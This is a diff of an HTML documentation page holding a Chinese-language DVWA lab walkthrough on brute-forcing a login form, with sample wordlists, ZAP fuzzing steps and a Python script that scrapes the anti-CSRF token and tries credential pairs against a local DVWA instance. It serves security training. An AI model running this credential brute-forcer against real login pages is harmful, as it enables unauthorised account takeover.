@@ -13,7 +13,7 @@
         <meta name="description" content="drkless docs">
       
       
-        <link rel="canonical" href="https://darkless.cn/my-docs/DVWA暴力破解/">
+        <link rel="canonical" href="https://darkless.cn/my-docs/DVWA暴力破解(Brute Force)/">
       
       
         <meta name="author" content="hand">
@@ -42,7 +42,7 @@
     
     
       
-        <title>暴力破解 - DarkLess</title>
+        <title>Brute Force - DarkLess</title>
       
     
     
@@ -135,7 +135,7 @@
               DarkLess
             </span>
             <span class="md-header-nav__topic">
-              暴力破解
+              Brute Force
             </span>
           
         </div>
@@ -278,11 +278,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        暴力破解
+        Brute Force
       </label>
     
-    <a href="./" title="暴力破解" class="md-nav__link md-nav__link--active">
-      暴力破解
+    <a href="./" title="Brute Force" class="md-nav__link md-nav__link--active">
+      Brute Force
     </a>
     
       
@@ -365,8 +365,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../DVWA命令注入/" title="命令注入" class="md-nav__link">
-      命令注入
+    <a href="../DVWA命令注入(Command Injection)/" title="Command Injection" class="md-nav__link">
+      Command Injection
     </a>
   </li>
 
@@ -379,6 +379,30 @@
   <li class="md-nav__item">
     <a href="../DVWA CSRF/" title="CSRF" class="md-nav__link">
       CSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA 文件包含(File Inclusion)/" title="File Inclusion" class="md-nav__link">
+      File Inclusion
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DVWA 文件上传(File Upload)/" title="File Upload" class="md-nav__link">
+      File Upload
     </a>
   </li>
 
@@ -478,7 +502,7 @@
               
                 
                 
-                  <h1>暴力破解</h1>
+                  <h1>Brute Force</h1>
                 
                 <p>暴力破解通常是用手工或者工具的方法对一个网站的登陆页面不断尝试各种用户名和密码的组合，直到能试出正确的一个组合。</p>
 <p>DVWA的暴力破解难度等级分为四个 ：</p>
@@ -488,41 +512,41 @@
 <li>High:这一等级相比前两个等级有了较大的难度，在每次登陆时会带一个token字段发送到服务器端，服务器端会验证用户名，密码和token是否正确，正确才能登陆。token字段是随机生成的，当不了解使用何种算法生成token时是不能进行暴力破解的。</li>
 <li>Impossible: 这一等级DVWA在连续三次输错用户名和密码后会锁定15分钟，15分钟后才能尝试。这样的设定就无法进行暴力破解了。</li>
 </ul>
-<h2 id="_1">字典<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_1">字典</h2>
 <p><strong>暴力破解需要一本好的字典，字典越有针对性，破解过程越快。</strong>
 这里我们只是为了演示，就随便做了一个用户名的字典，一个密码的字典，字典内容如下：</p>
 <p>用户名字典：</p>
-<div class="codehilite"><pre><span></span>admin
+<pre><code class="text">admin
 user
 admin123
 root
 root123
 administrator
-</pre></div>
+</code></pre>
 
 <p>密码字典：</p>
-<div class="codehilite"><pre><span></span>123456
+<pre><code class="text">123456
 root
 admin123
 password
 qwerty
 abcd1234
-</pre></div>
+</code></pre>
 
-<h2 id="low">LOW等级暴力破解<a class="headerlink" href="#low" title="Permanent link">&para;</a></h2>
+<h2 id="low">LOW等级暴力破解</h2>
 <p>low等级的暴力破解比较简单，可以使用手工的方法在登陆页面不断进行尝试，但是这种方法用时会很长，这里我用用到了一款工具ZAP。</p>
 <blockquote>
 <p>OWASP Zed攻击代理（ZAP）是世界上最受欢迎的免费安全审计工具之一，由数百名国际志愿者积极维护。它可以帮助你在开发和测试应用程序时自动查找Web应用程序中的安全漏洞。
 也可以说ZAP是一个中间人代理。它能够获取你对Web应用程序发出的所有请求以及你从中收到的所有响应。</p>
 </blockquote>
 <p>ZAP的安装过程省略，提供一个ZAP的下载地址：<a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></p>
-<h3 id="_2">设置浏览器代理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h3 id="_2">设置浏览器代理</h3>
 <p>将其设置为ZAP所监听的端口，我设置的ZAP的端口为6666（默认端口为8080）。
 所以需要设置浏览器的代理为：127.0.0.1:6666</p>
 <p>浏览器端的设置代理的工具有很多，我用的是火狐浏览器，所用代理工具为“simpleProxy”。</p>
 <p><img alt="20190421213421.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421213421.png" /></p>
 <p>设置好代理后，浏览器端的所有请求和响应都会被ZAP所捕捉到。</p>
-<h3 id="_3">捕捉并分析请求<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_3">捕捉并分析请求</h3>
 <p>在DVWA上随便输入一个用户名和密码，点击登陆，然后在ZAP上查看捕捉到的数据包。</p>
 <p><img alt="20190421215720.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421215720.png" /></p>
 <p>分析捕获到的请求数据报头，发现报头中会携带用户名和密码发送到服务器端，然后服务器端判断是否正确。此时我们就可以在ZAP上不断修改用户名和密码发送到服务器端，然后根据响应结果判断用户名密码是否正确。
@@ -530,31 +554,31 @@ ZAP提供的Fuzzer功能可以按照我们提供的字典修改请求头中的�
 <p><img alt="20190421220715.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421220715.png" /></p>
 <p>参数设置好后就可以开始爆破了。</p>
 <p><img alt="20190421221327.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421221327.png" /></p>
-<h3 id="_4">分析服务器返回的数据<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_4">分析服务器返回的数据</h3>
 <p><img alt="20190421222034.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421222034.png" /></p>
 <p>分析数据包发现有一个数据返回的Body大小和其它的都不一样，于是怀疑这条数据是登陆成功后返回的，其它的都是登陆失败后返回的。毕竟正确的用户名和密码只有一个。
 于是将此用户名和密码输入到DVWA上发现登陆成功。</p>
 <p><img alt="20190421223450.png" src="https://raw.githubusercontent.com/handbye/images/master/20190421223450.png" /></p>
-<h2 id="medium">Medium等级暴力破解<a class="headerlink" href="#medium" title="Permanent link">&para;</a></h2>
+<h2 id="medium">Medium等级暴力破解</h2>
 <p>Medium等级的暴力破解和LOW等级的暴力破解方法相同，只不过破解时间会变慢。在DVWA上查看源代码发现，每当输入错误的密码后，就会等待0-3秒才能进行下一次登陆。</p>
-<div class="codehilite"><pre><span></span><span class="x">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {</span>
-<span class="x">        // Get users details</span>
-<span class="x">        $row    = mysqli_fetch_assoc( $result );</span>
-<span class="x">        $avatar = $row[&quot;avatar&quot;];</span>
+<pre><code class="php">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
 
-<span class="x">        // Login successful</span>
-<span class="x">        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;</span>
-<span class="x">        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;</span>
-<span class="x">    }</span>
-<span class="x">    else {</span>
-<span class="x">        // Login failed</span>
-<span class="x">        sleep( rand( 0, 3 ) );</span>
-<span class="x">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span>
-<span class="x">    } ;</span>
-</pre></div>
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+    }
+    else {
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    } ;
+</code></pre>
 
 <p>此种方法只会延长暴力破解的时间，并不能阻止暴力破解。</p>
-<h2 id="hight">Hight等级暴力破解<a class="headerlink" href="#hight" title="Permanent link">&para;</a></h2>
+<h2 id="hight">Hight等级暴力破解</h2>
 <p>和LOW等级一样，我们抓取Hight等级的请求数据包进行观察。</p>
 <p><img alt="20190422000439.png" src="https://raw.githubusercontent.com/handbye/images/master/20190422000439.png" /></p>
 <p>发现这个请求头比LOW等级的多了一个user_token参数，而且每次请求的user_token参数都是不同的。</p>
@@ -565,66 +589,66 @@ ZAP提供的Fuzzer功能可以按照我们提供的字典修改请求头中的�
 <p>这里我写一段python代码来进行破解，思路大概是每次登陆前先获取HTNL代码中的value值然后放入header头中去请求服务器，直到成功为止。也可以使用burpsuit进行破解，过程请参考：
 <a href="https://blog.csdn.net/liweibin812/article/details/86287645">https://blog.csdn.net/liweibin812/article/details/86287645</a></p>
 <p>代码如下：</p>
-<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
-<span class="kn">import</span> <span class="nn">sys</span>
+<pre><code class="python">import requests
+from bs4 import BeautifulSoup
+import sys
 
-<span class="c1">#DVWA High等级暴力破解</span>
+#DVWA High等级暴力破解
 
-<span class="c1">#获取user_token值</span>
-<span class="n">header</span><span class="o">=</span><span class="p">{</span>
-    <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;security=high; PHPSESSID=mtsel2kcb1a4uecf6b7e87aa23&#39;</span><span class="p">,</span>
-<span class="p">}</span>
+#获取user_token值
+header={
+    'Host': '127.0.0.1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/brute/',
+    'Connection': 'keep-alive',
+    'Cookie': 'security=high; PHPSESSID=mtsel2kcb1a4uecf6b7e87aa23',
+}
 
-<span class="k">def</span> <span class="nf">get_user_token</span><span class="p">():</span>
-    <span class="c1"># 获取DVWA登陆页面</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
-    <span class="n">rsp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+def get_user_token():
+    # 获取DVWA登陆页面
+    r = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/',headers=header)
+    rsp = r.text
 
-    <span class="c1"># 获取登陆表单中的value值</span>
-    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">rsp</span><span class="p">,</span><span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
-    <span class="n">input_name</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;user_token&#39;</span><span class="p">})</span>
-    <span class="n">value</span> <span class="o">=</span> <span class="n">input_name</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
-    <span class="k">return</span>  <span class="n">value</span>
+    # 获取登陆表单中的value值
+    soup = BeautifulSoup(rsp,'lxml')
+    input_name = soup.find(attrs={'name':'user_token'})
+    value = input_name['value']
+    return  value
 
 
-<span class="c1">#读取用户名和密码字典</span>
-<span class="n">f1</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;username.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
-<span class="n">user_list</span> <span class="o">=</span> <span class="n">f1</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">user_list</span><span class="p">)):</span>
-    <span class="n">user_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">f1</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+#读取用户名和密码字典
+f1 = open('username.txt','r')
+user_list = f1.readlines()
+for i in range(0,len(user_list)):
+    user_list[i] = user_list[i].rstrip('\n')
+f1.close()
 
-<span class="n">f2</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;password.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
-<span class="n">pass_list</span> <span class="o">=</span> <span class="n">f2</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">pass_list</span><span class="p">)):</span>
-    <span class="n">pass_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pass_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">f2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+f2 = open('password.txt','r')
+pass_list = f2.readlines()
+for i in range(0,len(pass_list)):
+    pass_list[i] = pass_list[i].rstrip('\n')
+f2.close()
 
-<span class="c1"># value值即get请求头中的user_token</span>
-<span class="c1"># 开始组合请求头并发送到服务器</span>
-<span class="k">for</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">user_list</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">pass_list</span><span class="p">:</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;Login&#39;</span><span class="p">:</span><span class="s1">&#39;Login&#39;</span><span class="p">,</span><span class="s1">&#39;user_token&#39;</span><span class="p">:</span><span class="n">get_user_token</span><span class="p">()}</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/dvwa/vulnerabilities/brute/&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
-        <span class="n">rsp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
-        <span class="c1">#判断是否登陆成功</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">rsp</span><span class="p">,</span><span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
-            <span class="n">error_text</span><span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">pre</span><span class="o">.</span><span class="n">br</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
-            <span class="n">error_text</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">error_text</span><span class="p">)</span>
-            <span class="k">if</span> <span class="s1">&#39;incorrect&#39;</span> <span class="ow">in</span> <span class="n">error_text</span><span class="p">:</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="s1">&#39;  &#39;</span><span class="o">+</span><span class="s1">&#39;错误&#39;</span><span class="p">)</span>
-        <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="s1">&#39;  &#39;</span><span class="o">+</span><span class="s1">&#39;正确&#39;</span><span class="p">)</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span> <span class="c1">#找到正确密码就退出程序，不在往下执行</span>
-</pre></div>
+# value值即get请求头中的user_token
+# 开始组合请求头并发送到服务器
+for username in user_list:
+    for password in pass_list:
+        payload = {'username':username,'password':password,'Login':'Login','user_token':get_user_token()}
+        r = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/',headers=header,params=payload)
+        rsp = r.text
+        #判断是否登陆成功
+        try:
+            soup = BeautifulSoup(rsp,'lxml')
+            error_text= soup.find(soup.pre.br.string)
+            error_text = str(error_text)
+            if 'incorrect' in error_text:
+                print(username,password+'  '+'错误')
+        except AttributeError:
+            print(username,password+'  '+'正确')
+            sys.exit() #找到正确密码就退出程序，不在往下执行
+</code></pre>
                 
                   
                 
@@ -660,13 +684,13 @@ ZAP提供的Fuzzer功能可以按照我们提供的字典修改请求头中的�
           </a>
         
         
-          <a href="../DVWA命令注入/" title="命令注入" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../DVWA命令注入(Command Injection)/" title="Command Injection" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   前进
                 </span>
-                命令注入
+                Command Injection
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
